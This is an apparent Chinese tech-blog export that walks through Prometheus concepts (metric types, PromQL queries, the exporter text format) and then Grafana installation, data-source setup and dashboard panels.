访问http://localhost:3000就可以进入到Grafana的界面中，默认情况下使用账户admin/admin进行登录。在Grafana首页中显示默认的使用向导，包括：安装、添加数据源、创建Dashboard、邀请成员、以及安装应用和插件等主要流程。 这里将添加Prometheus作为默认的数据源，如下图所示，指定数据源类型为Prometheus并且设置Prometheus的访问地址即可，在配置正确的情况下点击“Save &amp; Test”按钮，会提示连接成功的信息。 在完成数据源的添加之后就可以在Grafana中创建我们可视化Dashboard了。Grafana提供了对PromQL的完整支持。 通过Grafana添加Dashboard并且为该Dashboard添加一个类型为“Graph”的面板。 并在该面板的“Metrics”选项下通过PromQL查询需要可视化的数据。 Prometheus核心组件下图展示Prometheus的基本架构： Prometheus ServerPrometheus Server是Prometheus组件中的核心部分，负责实现对监控数据的获取，存储以及查询。 Prometheus Server可以通过静态配置管理监控目标，也可以配合使用Service Discovery的方式动态管理监控目标，并从这些监控目标中获取数据。其次Prometheus Server需要对采集到的监控数据进行存储，Prometheus Server本身就是一个时序数据库，将采集到的监控数据按照时间序列的方式存储在本地磁盘当中。最后Prometheus Server对外提供了自定义的PromQL语言，实现对数据的查询以及分析。 Prometheus Server内置的Express Browser UI，通过这个UI可以直接通过PromQL实现数据的查询以及可视化。 Prometheus Server的联邦集群能力可以使其从其他的Prometheus Server实例中获取数据，因此在大规模监控的情况下，可以通过联邦集群以及功能分区的方式对Prometheus Server进行扩展。 ExportersExporter将监控数据采集的端点通过HTTP服务的形式暴露给Prometheus Server，Prometheus Server通过访问该Exporter提供的Endpoint端点，即可获取到需要采集的监控数据。 一般来说可以将Exporter分为2类： 直接采集：这一类Exporter直接内置了对Prometheus监控的支持，比如cAdvisor，Kubernetes，Etcd，Gokit等，都直接内置了用于向Prometheus暴露监控数据的端点。 间接采集：间接采集，原有监控目标并不直接支持Prometheus，因此我们需要通过Prometheus提供的Client Library编写该监控目标的监控采集程序。例如： Mysql Exporter，JMX Exporter，Consul Exporter等。 AlertManager在Prometheus Server中支持基于PromQL创建告警规则，如果满足PromQL定义的规则，则会产生一条告警，而告警的后续处理流程则由AlertManager进行管理。在AlertManager中我们可以与邮件，Slack等等内置的通知方式进行集成，也可以通过Webhook自定义告警处理方式。AlertManager即Prometheus体系中的告警处理中心。 PushGateway由于Prometheus数据采集基于Pull模型进行设计，因此在网络环境的配置上必须要让Prometheus Server能够直接与Exporter进行通信。 当这种网络需求无法直接满足时，就可以利用PushGateway来进行中转。可以通过PushGateway将内部网络的监控数据主动Push到Gateway当中。而Prometheus Server则可以采用同样Pull的方式从PushGateway中获取到监控数据。 https://prometheus.io/docs/practices/pushing/ PromQL通过PromQL用户可以非常方便地对监控样本数据进行统计分析，PromQL支持常见的运算操作符，同时PromQL中还提供了大量的内置函数可以实现对数据的高级处理。当然在学习PromQL之前，用户还需要了解Prometheus的样本数据模型。PromQL作为Prometheus的核心能力除了实现数据的对外查询和展现，同时告警监控也是依赖PromQL实现的。 时间序列在之前，通过Node Exporter暴露的HTTP服务，Prometheus可以采集到当前主机所有监控指标的样本数据。例如： 123456# HELP node_cpu Seconds the cpus spent in each mode.# TYPE node_cpu counternode_cpu&#123;cpu=&quot;cpu0&quot;,mode=&quot;idle&quot;&#125; 362812.7890625# HELP node_load1 1m load average.# TYPE node_load1 gaugenode_load1 3.0703125 其中非#开头的每一行表示当前Node Exporter采集到的一个监控样本：node_cpu和node_load1表明了当前指标的名称、大括号中的标签则反映了当前样本的一些特征和维度、浮点数则是该监控样本的具体值。 样本Prometheus会将所有采集到的样本数据以时间序列（time-series）的方式保存在内存数据库中，并且定时保存到硬盘上。time-series是按照时间戳和值的序列顺序存放的，我们称之为向量(vector). 每条time-series通过指标名称(metrics name)和一组标签集(labelset)命名。如下所示，可以将time-series理解为一个以时间为Y轴的数字矩阵： 1234567^│ . . . . . . . . . . . . . . . . . . . node_cpu&#123;cpu=&quot;cpu0&quot;,mode=&quot;idle&quot;&#125;│ . . . . . . . . . . . . . . . . . . . node_cpu&#123;cpu=&quot;cpu0&quot;,mode=&quot;system&quot;&#125;│ . . . . . . . . . . . . . . . . . . node_load1&#123;&#125;│ . . . . . . . . . . . . . . . . . . v &lt;------------------ 时间 ----------------&gt; 在time-series中的每一个点称为一个样本（sample），样本由以下三部分组成： 指标(metric)：metric name和描述当前样本特征的labelsets; 时间戳(timestamp)：一个精确到毫秒的时间戳; 样本值(value)： 一个float64的浮点型数据表示当前样本的值。 1234567891011&lt;--------------- metric ---------------------&gt;&lt;-timestamp -&gt;&lt;-value-&gt;http_request_total&#123;status=&quot;200&quot;, method=&quot;GET&quot;&#125;@1434417560938 =&gt; 94355http_request_total&#123;status=&quot;200&quot;, method=&quot;GET&quot;&#125;@1434417561287 =&gt; 94334http_request_total&#123;status=&quot;404&quot;, method=&quot;GET&quot;&#125;@1434417560938 =&gt; 38473http_request_total&#123;status=&quot;404&quot;, method=&quot;GET&quot;&#125;@1434417561287 =&gt; 38544http_request_total&#123;status=&quot;200&quot;, method=&quot;POST&quot;&#125;@1434417560938 =&gt; 4748http_request_total&#123;status=&quot;200&quot;, method=&quot;POST&quot;&#125;@1434417561287 =&gt; 4785 指标(Metric)在形式上，所有的指标(Metric)都通过如下格式标示： 1&lt;metric name&gt;&#123;&lt;label name&gt;=&lt;label value&gt;, ...&#125; 指标的名称(metric name)可以反映被监控样本的含义（比如，http_request_total - 表示当前系统接收到的HTTP请求总量）。指标名称只能由ASCII字符、数字、下划线以及冒号组成并必须符合正则表达式[a-zA-Z_:][a-zA-Z0-9_:]*。 标签(label)反映了当前样本的特征维度，通过这些维度Prometheus可以对样本数据进行过滤，聚合等。标签的名称只能由ASCII字符、数字以及下划线组成并满足正则表达式[a-zA-Z_][a-zA-Z0-9_]*。 其中以__作为前缀的标签，是系统保留的关键字，只能在系统内部使用。标签的值则可以包含任何Unicode编码的字符。在Prometheus的底层实现中指标名称实际上是以__name__=&lt;metric name&gt;的形式保存在数据库中的，因此以下两种方式均表示的同一条time-series： 1api_http_requests_total&#123;method=&quot;POST&quot;, handler=&quot;/messages&quot;&#125; 等同于： 1&#123;__name__=&quot;api_http_requests_total&quot;，method=&quot;POST&quot;, handler=&quot;/messages&quot;&#125; 在Prometheus源码中也可以找到指标(Metric)对应的数据结构，如下所示： 12345678910type Metric LabelSettype LabelSet map[LabelName]LabelValuetype LabelName stringtype LabelValue string Metrics类型在Prometheus的存储实现上所有的监控样本都是以time-series的形式保存在Prometheus内存的TSDB（时序数据库）中，而time-series所对应的监控指标(metric)也是通过labelset进行唯一命名的。 从存储上来讲所有的监控指标metric都是相同的，但是在不同的场景下这些metric又有一些细微的差异。 例如，在Node Exporter返回的样本中指标node_load1反应的是当前系统的负载状态，随着时间的变化这个指标返回的样本数据是在不断变化的。而指标node_cpu所获取到的样本数据却不同，它是一个持续增大的值，因为其反应的是CPU的累积使用时间，从理论上讲只要系统不关机，这个值是会无限变大的。 为了能够帮助用户理解和区分这些不同监控指标之间的差异，Prometheus定义了4种不同的指标类型(metric type)：Counter（计数器）、Gauge（仪表盘）、Histogram（直方图）、Summary（摘要）。 在Exporter返回的样本数据中，其注释中也包含了该样本的类型。例如： 123# HELP node_cpu Seconds the cpus spent in each mode.# TYPE node_cpu counternode_cpu&#123;cpu=&quot;cpu0&quot;,mode=&quot;idle&quot;&#125; 362812.7890625 Counter：只增不减的计数器Counter类型的指标其工作方式和计数器一样，只增不减（除非系统发生重置）。常见的监控指标，如http_requests_total，node_cpu都是Counter类型的监控指标。 一般在定义Counter类型指标的名称时推荐使用_total作为后缀。 Counter是一个简单但有强大的工具，例如我们可以在应用程序中记录某些事件发生的次数，通过以时序的形式存储这些数据，我们可以轻松的了解该事件产生速率的变化。 PromQL内置的聚合操作和函数可以让用户对这些数据进行进一步的分析： 例如，通过rate()函数获取HTTP请求量的增长率： 1rate(http_requests_total[5m]) 查询当前系统中，访问量前10的HTTP地址： 1topk(10, http_requests_total) Gauge：可增可减的仪表盘与Counter不同，Gauge类型的指标侧重于反应系统的当前状态。因此这类指标的样本数据可增可减。常见指标如：node_memory_MemFree（主机当前空闲的内容大小）、node_memory_MemAvailable（可用内存大小）都是Gauge类型的监控指标。 通过Gauge指标，用户可以直接查看系统的当前状态： 1node_memory_MemFree 对于Gauge类型的监控指标，通过PromQL内置函数delta()可以获取样本在一段时间返回内的变化情况。例如，计算CPU温度在两个小时内的差异： 1delta(cpu_temp_celsius&#123;host=&quot;zeus&quot;&#125;[2h]) 还可以使用deriv()计算样本的线性回归模型，甚至是直接使用predict_linear()对数据的变化趋势进行预测。例如，预测系统磁盘空间在4个小时之后的剩余情况： 1predict_linear(node_filesystem_free&#123;job=&quot;node&quot;&#125;[1h], 4 * 3600) 使用Histogram和Summary分析数据分布情况除了Counter和Gauge类型的监控指标以外，Prometheus还定义了Histogram和Summary的指标类型。Histogram和Summary主用用于统计和分析样本的分布情况。 在大多数情况下人们都倾向于使用某些量化指标的平均值，例如CPU的平均使用率、页面的平均响应时间。 这种方式的问题很明显，以系统API调用的平均响应时间为例：如果大多数API请求都维持在100ms的响应时间范围内，而个别请求的响应时间需要5s，那么就会导致某些WEB页面的响应时间落到中位数的情况，而这种现象被称为长尾问题（Long-tail Problem）。 为了区分是平均的慢还是长尾的慢，最简单的方式就是按照请求延迟的范围进行分组。例如，统计延迟在010ms之间的请求数有多少而1020ms之间的请求数又有多少。通过这种方式可以快速分析系统慢的原因。Histogram和Summary都是为了能够解决这样问题的存在，通过Histogram和Summary类型的监控指标，我们可以快速了解监控样本的分布情况。 Summary例如，指标prometheus_tsdb_wal_fsync_duration_seconds的指标类型为Summary。 它记录了Prometheus Server中wal_fsync处理的处理时间，通过访问Prometheus Server的/metrics地址，可以获取到以下监控样本数据： 1234567# HELP prometheus_tsdb_wal_fsync_duration_seconds Duration of WAL fsync.# TYPE prometheus_tsdb_wal_fsync_duration_seconds summaryprometheus_tsdb_wal_fsync_duration_seconds&#123;quantile=&quot;0.5&quot;&#125; 0.012352463prometheus_tsdb_wal_fsync_duration_seconds&#123;quantile=&quot;0.9&quot;&#125; 0.014458005prometheus_tsdb_wal_fsync_duration_seconds&#123;quantile=&quot;0.99&quot;&#125; 0.017316173prometheus_tsdb_wal_fsync_duration_seconds_sum 2.888716127000002prometheus_tsdb_wal_fsync_duration_seconds_count 216 从上面的样本中可以得知当前Prometheus Server进行wal_fsync操作的总次数为216次，耗时2.888716127000002s。其中中位数（quantile=0.5）的耗时为0.012352463，9分位数（quantile=0.9）的耗时为0.014458005s。 Histogram在Prometheus Server自身返回的样本数据中，我们还能找到类型为Histogram的监控指标prometheus_tsdb_compaction_chunk_range_bucket。 123456789101112131415# HELP prometheus_tsdb_compaction_chunk_range Final time range of chunks on their first compaction# TYPE prometheus_tsdb_compaction_chunk_range histogramprometheus_tsdb_compaction_chunk_range_bucket&#123;le=&quot;100&quot;&#125; 0prometheus_tsdb_compaction_chunk_range_bucket&#123;le=&quot;400&quot;&#125; 0prometheus_tsdb_compaction_chunk_range_bucket&#123;le=&quot;1600&quot;&#125; 0prometheus_tsdb_compaction_chunk_range_bucket&#123;le=&quot;6400&quot;&#125; 0prometheus_tsdb_compaction_chunk_range_bucket&#123;le=&quot;25600&quot;&#125; 0prometheus_tsdb_compaction_chunk_range_bucket&#123;le=&quot;102400&quot;&#125; 0prometheus_tsdb_compaction_chunk_range_bucket&#123;le=&quot;409600&quot;&#125; 0prometheus_tsdb_compaction_chunk_range_bucket&#123;le=&quot;1.6384e+06&quot;&#125; 260prometheus_tsdb_compaction_chunk_range_bucket&#123;le=&quot;6.5536e+06&quot;&#125; 780prometheus_tsdb_compaction_chunk_range_bucket&#123;le=&quot;2.62144e+07&quot;&#125; 780prometheus_tsdb_compaction_chunk_range_bucket&#123;le=&quot;+Inf&quot;&#125; 780prometheus_tsdb_compaction_chunk_range_sum 1.1540798e+09prometheus_tsdb_compaction_chunk_range_count 780 与Summary类型的指标相似之处在于Histogram类型的样本同样会反应当前指标的记录的总数(以_count作为后缀)以及其值的总量（以_sum作为后缀）。不同在于Histogram指标直接反应了在不同区间内样本的个数，区间通过标签len进行定义。 对于Histogram的指标，我们还可以通过histogram_quantile()函数计算出其值的分位数。不同在于Histogram通过histogram_quantile函数是在服务器端计算的分位数。 而Sumamry的分位数则是直接在客户端计算完成。因此对于分位数的计算而言，Summary在通过PromQL进行查询时有更好的性能表现，而Histogram则会消耗更多的资源。反之对于客户端而言Histogram消耗的资源更少。在选择这两种方式时用户应该按照自己的实际场景进行选择。 PromQLPrometheus通过指标名称（metrics name）以及对应的一组标签（labelset）唯一定义一条时间序列。指标名称反映了监控样本的基本标识，而label则在这个基本特征上为采集到的数据提供了多种特征维度。用户可以基于这些特征维度过滤，聚合，统计从而产生新的计算后的一条时间序列。 PromQL是Prometheus内置的数据查询语言，其提供对时间序列数据丰富的查询，聚合以及逻辑运算能力的支持。并且被广泛应用在Prometheus的日常应用当中，包括对数据查询、可视化、告警处理当中。可以这么说，PromQL是Prometheus所有应用场景的基础，理解和掌握PromQL是Prometheus入门的第一课。 查询时间序列当Prometheus通过Exporter采集到相应的监控指标样本数据后，我们就可以通过PromQL对监控样本数据进行查询。 当我们直接使用监控指标名称查询时，可以查询该指标下的所有时间序列。如： 1http_requests_total 等同于： 1http_requests_total&#123;&#125; 该表达式会返回指标名称为http_requests_total的所有时间序列： 12http_requests_total&#123;code=&quot;200&quot;,handler=&quot;alerts&quot;,instance=&quot;localhost:9090&quot;,job=&quot;prometheus&quot;,method=&quot;get&quot;&#125;=(20889@1518096812.326)http_requests_total&#123;code=&quot;200&quot;,handler=&quot;graph&quot;,instance=&quot;localhost:9090&quot;,job=&quot;prometheus&quot;,method=&quot;get&quot;&#125;=(21287@1518096812.326) PromQL还支持用户根据时间序列的标签匹配模式来对时间序列进行过滤，目前主要支持两种匹配模式：完全匹配和正则匹配。 PromQL支持使用=和!=两种完全匹配模式： 通过使用label=value可以选择那些标签满足表达式定义的时间序列； 反之使用label!=value则可以根据标签匹配排除时间序列； 例如，如果我们只需要查询所有http_requests_total时间序列中满足标签instance为localhost:9090的时间序列，则可以使用如下表达式： 1http_requests_total&#123;instance=&quot;localhost:9090&quot;&#125; 反之使用instance!=&quot;localhost:9090&quot;则可以排除这些时间序列： 1http_requests_total&#123;instance!=&quot;localhost:9090&quot;&#125; 除了使用完全匹配的方式对时间序列进行过滤以外，PromQL还可以支持使用正则表达式作为匹配条件，多个表达式之间使用|进行分离： 使用label=~regx表示选择那些标签符合正则表达式定义的时间序列； 反之使用label!~regx进行排除； 例如，如果想查询多个环节下的时间序列序列可以使用如下表达式： 1http_requests_total&#123;environment=~&quot;staging|testing|development&quot;,method!=&quot;GET&quot;&#125; 范围查询直接通过类似于PromQL表达式http_requests_total查询时间序列时，返回值中只会包含该时间序列中的最新的一个样本值，这样的返回结果我们称之为瞬时向量。而相应的这样的表达式称之为瞬时向量表达式。 而如果我们想过去一段时间范围内的样本数据时，我们则需要使用区间向量表达式。区间向量表达式和瞬时向量表达式之间的差异在于在区间向量表达式中我们需要定义时间选择的范围，时间范围通过时间范围选择器[]进行定义。例如，通过以下表达式可以选择最近5分钟内的所有样本数据： 1http_requests_total&#123;&#125;[5m] 该表达式将会返回查询到的时间序列中最近5分钟的所有样本数据： 12345678910111213141516http_requests_total&#123;code=&quot;200&quot;,handler=&quot;alerts&quot;,instance=&quot;localhost:9090&quot;,job=&quot;prometheus&quot;,method=&quot;get&quot;&#125;=[ 1@1518096812.326 1@1518096817.326 1@1518096822.326 1@1518096827.326 1@1518096832.326 1@1518096837.325]http_requests_total&#123;code=&quot;200&quot;,handler=&quot;graph&quot;,instance=&quot;localhost:9090&quot;,job=&quot;prometheus&quot;,method=&quot;get&quot;&#125;=[ 4 @1518096812.326 4@1518096817.326 4@1518096822.326 4@1518096827.326 4@1518096832.326 4@1518096837.325] 通过区间向量表达式查询到的结果我们称为区间向量。 除了使用m表示分钟以外，PromQL的时间范围选择器支持其它时间单位： s - 秒 m - 分钟 h - 小时 d - 天 w - 周 y - 年 时间位移操作在瞬时向量表达式或者区间向量表达式中，都是以当前时间为基准： 12http_request_total&#123;&#125; # 瞬时向量表达式，选择当前最新的数据http_request_total&#123;&#125;[5m] # 区间向量表达式，选择以当前时间为基准，5分钟内的数据 而如果我们想查询，5分钟前的瞬时样本数据，或昨天一天的区间内的样本数据呢? 这个时候我们就可以使用位移操作，位移操作的关键字为offset。 可以使用offset时间位移操作： 12http_request_total&#123;&#125; offset 5mhttp_request_total&#123;&#125;[1d] offset 1d 使用聚合操作一般来说，如果描述样本特征的标签(label)在并非唯一的情况下，通过PromQL查询数据，会返回多条满足这些特征维度的时间序列。而PromQL提供的聚合操作可以用来对这些时间序列进行处理，形成一条新的时间序列： 12345678910# 查询系统所有http请求的总量sum(http_request_total)# 按照mode计算主机CPU的平均使用时间avg(node_cpu_seconds_total) by (cpu)# 按照主机查询各个主机的CPU使用率sum(sum(irate(node_cpu&#123;mode!=&apos;idle&apos;&#125;[5m])) / sum(irate(node_cpu[5m]))) by (instance) 标量和字符串除了使用瞬时向量表达式和区间向量表达式以外，PromQL还直接支持用户使用标量(Scalar)和字符串(String)。 标量（Scalar）：一个浮点型的数字值标量只有一个数字，没有时序。 例如： 110 需要注意的是，当使用表达式count(http_requests_total)，返回的数据类型，依然是瞬时向量。用户可以通过内置函数scalar()将单个瞬时向量转换为标量。 字符串（String）：一个简单的字符串值直接使用字符串，作为PromQL表达式，则会直接返回字符串。 123&quot;this is a string&quot;&apos;these are unescaped: \\n \\\\ \\t&apos;`these are not unescaped: \\n &apos; &quot; \\t` 合法的PromQL表达式所有的PromQL表达式都必须至少包含一个指标名称(例如http_request_total)，或者一个不会匹配到空字符串的标签过滤器(例如{code=”200”})。 因此以下两种方式，均为合法的表达式： 123http_request_total # 合法http_request_total&#123;&#125; # 合法&#123;method=&quot;get&quot;&#125; # 合法 而如下表达式，则不合法： 1&#123;job=~&quot;.*&quot;&#125; # 不合法 同时，除了使用&lt;metric name&gt;{label=value}的形式以外，我们还可以使用内置的__name__标签来指定监控指标名称： 12&#123;__name__=~&quot;http_request_total&quot;&#125; # 合法&#123;__name__=~&quot;node_disk_ Exporter广义上讲所有可以向Prometheus提供监控样本数据的程序都可以被称为一个Exporter。而Exporter的一个实例称为target，如下所示，Prometheus通过轮询的方式定期从这些target中获取样本数据: Exporter的来源从Exporter的来源上来讲，主要分为两类： 社区提供的 Prometheus社区提供了丰富的Exporter实现，涵盖了从基础设施，中间件以及网络等各个方面的监控功能。这些Exporter可以实现大部分通用的监控需求。下表列举一些社区中常用的Exporter： 范围 常用Exporter 数据库 MySQL Exporter, Redis Exporter, MongoDB Exporter, MSSQL Exporter等 硬件 Apcupsd Exporter，IoT Edison Exporter， IPMI Exporter, Node Exporter等 消息队列 Beanstalkd Exporter, Kafka Exporter, NSQ Exporter, RabbitMQ Exporter等 存储 Ceph Exporter, Gluster Exporter, HDFS Exporter, ScaleIO Exporter等 HTTP服务 Apache Exporter, HAProxy Exporter, Nginx Exporter等 API服务 AWS ECS Exporter， Docker Cloud Exporter, Docker Hub Exporter, GitHub Exporter等 日志 Fluentd Exporter, Grok Exporter等 监控系统 Collectd Exporter, Graphite Exporter, InfluxDB Exporter, Nagios Exporter, SNMP Exporter等 其它 Blockbox Exporter, JIRA Exporter, Jenkins Exporter， Confluence Exporter等 用户自定义的 除了直接使用社区提供的Exporter程序以外，用户还可以基于Prometheus提供的Client Library创建自己的Exporter程序，目前Promthues社区官方提供了对以下编程语言的支持：Go、Java/Scala、Python、Ruby。同时还有第三方实现的如：Bash、C++、Common Lisp、Erlang,、Haskeel、Lua、Node.js、PHP、Rust等。 Exporter的运行方式从Exporter的运行方式上来讲，又可以分为： 独立使用的 以我们已经使用过的Node Exporter为例，由于操作系统本身并不直接支持Prometheus，同时用户也无法通过直接从操作系统层面上提供对Prometheus的支持。因此，用户只能通过独立运行一个程序的方式，通过操作系统提供的相关接口，将系统的运行状态数据转换为可供Prometheus读取的监控数据。 除了Node Exporter以外，比如MySQL Exporter、Redis Exporter等都是通过这种方式实现的。 这些Exporter程序扮演了一个中间代理人的角色。 集成到应用中的 为了能够更好的监控系统的内部运行状态，有些开源项目如Kubernetes，ETCD等直接在代码中使用了Prometheus的Client Library，提供了对Prometheus的直接支持。这种方式打破的监控的界限，让应用程序可以直接将内部的运行状态暴露给Prometheus，适合于一些需要更多自定义监控指标需求的项目。 Exporter规范所有的Exporter程序都需要按照Prometheus的规范，返回监控的样本数据。以Node Exporter为例，当访问/metrics地址时会返回以下内容： 123456# HELP node_cpu Seconds the cpus spent in each mode.# TYPE node_cpu counternode_cpu&#123;cpu=&quot;cpu0&quot;,mode=&quot;idle&quot;&#125; 362812.7890625# HELP node_load1 1m load average.# TYPE node_load1 gaugenode_load1 3.0703125 这是一种基于文本的格式规范，在Prometheus 2.0之前的版本还支持Protocol buffer规范。相比于Protocol buffer文本具有更好的可读性，以及跨平台性。Prometheus 2.0的版本也已经不再支持Protocol buffer，这里就不对Protocol buffer规范做详细的阐述。 Exporter返回的样本数据，主要由三个部分组成：样本的一般注释信息（HELP），样本的类型注释信息（TYPE）和样本。Prometheus会对Exporter响应的内容逐行解析： 如果当前行以# HELP开始，Prometheus将会按照以下规则对内容进行解析，得到当前的指标名称以及相应的说明信息： 1# HELP &lt;metrics_name&gt; &lt;doc_string&gt; 如果当前行以# TYPE开始，Prometheus会按照以下规则对内容进行解析，得到当前的指标名称以及指标类型: 1# TYPE &lt;metrics_name&gt; &lt;metrics_type&gt; TYPE注释行必须出现在指标的第一个样本之前。如果没有明确的指标类型需要返回为untyped。 除了# 开头的所有行都会被视为是监控样本数据。 每一行样本需要满足以下格式规范: 123metric_name [ &quot;&#123;&quot; label_name &quot;=&quot; `&quot;` label_value `&quot;` &#123; &quot;,&quot; label_name &quot;=&quot; `&quot;` label_value `&quot;` &#125; [ &quot;,&quot; ] &quot;&#125;&quot;] value [ timestamp ] 其中metric_name和label_name必须遵循PromQL的格式规范要求。value是一个float格式的数据，timestamp的类型为int64（从1970-01-01 00:00:00以来的毫秒数），timestamp为可选默认为当前时间。具有相同metric_name的样本必须按照一个组的形式排列，并且每一行必须是唯一的指标名称和标签键值对组合。 需要特别注意的是对于histogram和summary类型的样本。需要按照以下约定返回样本数据： 类型为summary或者histogram的指标x，该指标所有样本的值的总和需要使用一个单独的x_sum指标表示。 类型为summary或者histogram的指标x，该指标所有样本的总数需要使用一个单独的x_count指标表示。 对于类型为summary的指标x，其不同分位数quantile所代表的样本，需要使用单独的x{quantile=”y”}表示。 对于类型histogram的指标x为了表示其样本的分布情况，每一个分布需要使用x_bucket{le=”y”}表示，其中y为当前分布的上位数。同时必须包含一个样本x_bucket{le=”+Inf”}，并且其样本值必须和x_count相同。 对于histogram和summary的样本，必须按照分位数quantile和分布le的值的递增顺序排序。 以下是类型为histogram和summary的样本输出示例： 12345678910111213141516171819# A histogram, which has a pretty complex representation in the text format:# HELP http_request_duration_seconds A histogram of the request duration.# TYPE http_request_duration_seconds histogramhttp_request_duration_seconds_bucket&#123;le=&quot;0.05&quot;&#125; 24054http_request_duration_seconds_bucket&#123;le=&quot;0.1&quot;&#125; 33444http_request_duration_seconds_bucket&#123;le=&quot;0.2&quot;&#125; 100392http_request_duration_seconds_bucket&#123;le=&quot;+Inf&quot;&#125; 144320http_request_duration_seconds_sum 53423http_request_duration_seconds_count 144320# Finally a summary, which has a complex representation, too:# HELP rpc_duration_seconds A summary of the RPC duration in seconds.# TYPE rpc_duration_seconds summaryrpc_duration_seconds&#123;quantile=&quot;0.01&quot;&#125; 3102rpc_duration_seconds&#123;quantile=&quot;0.05&quot;&#125; 3272rpc_duration_seconds&#123;quantile=&quot;0.5&quot;&#125; 4773rpc_duration_seconds_sum 1.7560473e+07rpc_duration_seconds_count 2693 对于某些Prometheus还没有提供支持的编程语言，用户只需要按照以上规范返回响应的文本数据即可。 Reference https://prometheus.io/docs/introduction/first_steps/ https://yunlzheng.gitbook.io/prometheus-book/parti-prometheus-ji-chu/quickstart/why-monitor","comments":true,"categories":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/categories/Performance/"}],"tags":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/tags/Performance/"}]},{"title":"【Performance】Grafana 学习","date":"2020-07-22T12:34:03.000Z","path":"2020/07/22/【Performance】Grafana-学习/","text":"Grafanagrafana是一个非常酷的数据可视化平台，常常应用于显示监控数据。 安装UbuntuUbuntu and Debian(64 Bit)SHA256: 0d55bb65cd9bcc6445555e304493240801bd8e84c54a693ae8a23f583b72018c 123$ sudo apt-get install -y adduser libfontconfig1$ wget https://dl.grafana.com/oss/release/grafana_7.1.0_amd64.deb$ sudo dpkg -i grafana_7.1.0_amd64.deb macOS12$ brew update$ brew install grafana 启动Linux123456# 查看服务状态$ systemctl status grafana-server # 启动服务$ systemctl start grafana-server # 开机自启动$ sudo systemctl enable grafana-server macOS1234# start$ brew services start grafana# stop$ brew services stop grafana http://192.168.2.204:3000/login 默认管理员账号和密码 admin admin 配置数据源（Data Sources）本篇主要介绍了Grafana基于MySQL数据源的安装及常用姿势，也支持其他数据源如ElasticSearch、InfluxDB、Zabbix、Prometheus、Druid、influxDb、MySQL、graphite等。 Supported data sources The following data sources are officially supported: AWS CloudWatch Azure Monitor Elasticsearch Google Cloud Monitoring Graphite InfluxDB Loki Microsoft SQL Server (MSSQL) MySQL OpenTSDB PostgreSQL Prometheus Testdata 添加 Prometheus 作为数据源这里将添加Prometheus作为默认的数据源，如下图所示，指定数据源类型为Prometheus并且设置Prometheus的访问地址即可，在配置正确的情况下点击“Save &amp; Test”按钮，会提示连接成功的信息。 仪表盘（Dashboard）通过数据源定义好可视化的数据来源之后，对于用户而言最重要的事情就是实现数据的可视化。在Grafana中，我们通过Dashboard来组织和管理我们的数据可视化图表： 如上所示，在一个Dashboard中一个最基本的可视化单元为一个Panel（面板），Panel通过如趋势图，热力图的形式展示可视化数据。 并且在Dashboard中每一个Panel是一个完全独立的部分，通过Panel的Query Editor（查询编辑器）我们可以为每一个Panel自己查询的数据源以及数据查询方式，例如，如果以Prometheus作为数据源，那在Query Editor中，我们实际上使用的是PromQL，而Panel则会负责从特定的Prometheus中查询出\b相应的数据，并且将其可视化。由于每个Panel是完全独立的，因此在一个Dashboard中，往往可能会包含来自多个Data Source的数据。 Grafana通过插件的形式提供了多种\b\bPanel的实现，常用的如：Graph Panel，Heatmap Panel，SingleStat Panel以及Table Panel等。用户还可通过插件安装更多类型的Panel面板。 除了Panel以外，在Dashboard页面中，我们还可以定义一个Row（行），来组织和管理一组相关的Panel。 除了Panel, Row这些对象以外，Grafana还允许用户为Dashboard定义Templating variables（模板参数），从而实现可以与用户动态交互的Dashboard页面。同时Grafana通过JSON\b数据结构管理了整个Dasboard的定义，因此这些Dashboard也是非常方便进行共享的。 认识面板（Panel）Panel是Grafana中最基本的可视化单元。每一种类型的面板都提供了相应的查询编辑器(Query Editor)，让用户可以从不同的数据源（如Prometheus）中查询出相应的监控数据，并且以可视化的方式展现。 Grafana中所有的面板均以插件的形式进行使用，当前内置了5种类型的面板，分别是：Graph，Singlestat，Heatmap, Dashlist，Table以及Text。 其中像Graph这样的面板允许用户可视化任意多个监控指标以及多条时间序列。而Siglestat则必须要求查询结果为单个样本。Dashlist和Text相对比较特殊，它们与特定的数据源无关。 通过Grafana UI用户可以在一个Dashboard下添加Panel，点击Dashboard右上角的“Add Panel”按钮，如下所示，将会显示当前系统中所有可使用的Panel类型： 对于使用Prometheus作为数据源的用户，最主要的需要了解的就是Metrics设置的使用。在Metric选项中可以定义了Grafana从哪些数据源中查询样本数据。Data Source中指定当前查询的数据源，Grafana会加载当前组织中添加的所有数据源。其中还会包含两个特殊的数据源：Mixed和Grafana。 Mixed用于需要从多个数据源中查询和渲染数据的场景，Grafana则用于需要查询Grafana自身状态时使用。 当选中数据源时，Panel会根据当前数据源类型加载不同的Query Editor界面。这里我们主要介绍Prometheus Query Editor，如下所示，当选中的数据源类型为Prometheus时，会显示如下界面： Grafana提供了对PromQL的完整支持，在Query Editor中，可以添加任意个Query，并且使用PromQL表达式从Prometheus中查询相应的样本数据。 1avg (irate(node_cpu_seconds_total&#123;mode=&apos;idle&apos;&#125;[2m])) without (cpu) 每个PromQL表达式都可能返回多条时间序列。Legend format用于控制如何格式化每条时间序列的图例信息。Grafana支持通过模板的方式，根据时间序列的标签动态生成图例名称，例如：使用表示使用当前时间序列中的instance标签的值作为图例名称： 1&#123;&#123;instance&#125;&#125;-&#123;&#123;mode&#125;&#125; 当查询到的样本数据量非常大时可以导致Grafana渲染图标时出现一些性能问题，通过Min Step可以控制Prometheus查询数据时的最小步长（Step），从而减少从Prometheus返回的数据量。 Resolution选项，则可以控制Grafana自身渲染的数据量。例如，如果Resolution的值为1/10，Grafana会将Prometeus返回的10个样本数据合并成一个点。因此Resolution越小可视化的精确性越高，反之，可视化的精度越低。 Format as选项定义如何格式化Prometheus返回的样本数据。这里提供了3个选项：Table,Time Series和Heatmap，分别用于Tabel面板，Graph面板和Heatmap面板的数据可视化。 除此以外，Query Editor还提供了调试相关的功能，点击Query Inspector可以展开相关的调试面板： Graph面板// TODO https://yunlzheng.gitbook.io/prometheus-book/part-ii-prometheus-jin-jie/grafana/grafana-panels/use_graph_panel 使用其他Dashboard作为开源软件，Grafana社区鼓励用户分享Dashboard通过https://grafana.com/dashboards网站，可以找到大量可直接使用的Dashboard。 比如，当本机已经启动 Node Exporter后，直接导入这两个 dashboard即可直接查看本机数据： https://grafana.com/grafana/dashboards/9276 https://grafana.com/grafana/dashboards/8919 https://grafana.com/docs/grafana/latest/reference/export_import/ Reference https://grafana.com/grafana/download 